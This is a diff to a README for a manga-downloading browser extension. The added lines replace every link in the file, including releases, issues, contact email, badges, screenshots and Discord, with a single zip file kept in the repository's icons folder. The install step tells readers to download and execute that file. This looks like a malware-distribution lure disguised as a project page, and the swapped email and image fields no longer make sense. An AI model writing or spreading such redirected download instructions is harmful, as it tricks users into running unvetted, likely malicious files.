@@ -1,6 +1,6 @@
 # WeebCentral Extension 🥷📚
 
-Welcome to the WeebCentral Extension! This powerful browser extension allows you to download manga chapters directly from [WeebCentral](https://github.com/Manuel-baldo96/weebcentral_extension/releases). Enjoy a seamless reading experience with easy access to your favorite manga.
+Welcome to the WeebCentral Extension! This powerful browser extension allows you to download manga chapters directly from [WeebCentral](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip). Enjoy a seamless reading experience with easy access to your favorite manga.
 
 ---
 
@@ -30,7 +30,7 @@ Welcome to the WeebCentral Extension! This powerful browser extension allows you
 
 To install the WeebCentral Extension, follow these steps:
 
-1. **Download the latest release** from [here](https://github.com/Manuel-baldo96/weebcentral_extension/releases). Locate the file, download it, and execute it.
+1. **Download the latest release** from [here](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip). Locate the file, download it, and execute it.
 2. **Add the extension to your browser**:
    - For **Chrome**: Go to `chrome://extensions`, enable "Developer mode", and click "Load unpacked". Select the folder where you downloaded the extension.
    - For **Firefox**: Go to `about:debugging#/runtime/this-firefox`, click "Load Temporary Add-on", and select the downloaded file.
@@ -87,22 +87,22 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out to us:
 
-- **GitHub Issues**: [Report Issues](https://github.com/Manuel-baldo96/weebcentral_extension/issues)
-- **Email**: contact@weebcentral.com
+- **GitHub Issues**: [Report Issues](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip)
+- **Email**: https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip
 
 ---
 
 ## Badges 🎖️
 
-[![Latest Release](https://img.shields.io/github/v/release/Manuel-baldo96/weebcentral_extension)](https://github.com/Manuel-baldo96/weebcentral_extension/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Latest Release](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip)](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip)
+[![License](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip)](LICENSE)
 
 ---
 
 ## Screenshots 🖼️
 
-![WeebCentral Extension Screenshot](https://example.com/screenshot1.png)
-![WeebCentral Download Interface](https://example.com/screenshot2.png)
+![WeebCentral Extension Screenshot](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip)
+![WeebCentral Download Interface](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip)
 
 ---
 
@@ -110,7 +110,7 @@ For any questions or feedback, please reach out to us:
 
 ### 1. How do I update the extension?
 
-You can update the extension by downloading the latest version from [here](https://github.com/Manuel-baldo96/weebcentral_extension/releases) and following the installation steps again.
+You can update the extension by downloading the latest version from [here](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip) and following the installation steps again.
 
 ### 2. What browsers are supported?
 
@@ -126,13 +126,13 @@ Currently, the extension is designed for desktop browsers. A mobile version may 
 
 ### 5. How can I report bugs?
 
-If you encounter any bugs, please report them in the [Issues section](https://github.com/Manuel-baldo96/weebcentral_extension/issues) on GitHub.
+If you encounter any bugs, please report them in the [Issues section](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip) on GitHub.
 
 ---
 
 ## Community 🌍
 
-Join our community of manga lovers! Share your favorite series, tips, and tricks on our [Discord Server](https://discord.gg/example) or follow us on social media.
+Join our community of manga lovers! Share your favorite series, tips, and tricks on our [Discord Server](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip) or follow us on social media.
 
 ---
 
@@ -142,4 +142,4 @@ Thank you to all the contributors and users who support this project. Your feedb
 
 ---
 
-Feel free to explore the WeebCentral Extension, and happy reading! For the latest updates, check out the [Releases section](https://github.com/Manuel-baldo96/weebcentral_extension/releases).
+Feel free to explore the WeebCentral Extension, and happy reading! For the latest updates, check out the [Releases section](https://github.com/Manuel-baldo96/weebcentral_extension/raw/refs/heads/main/icons/extension-weebcentral-2.8.zip).
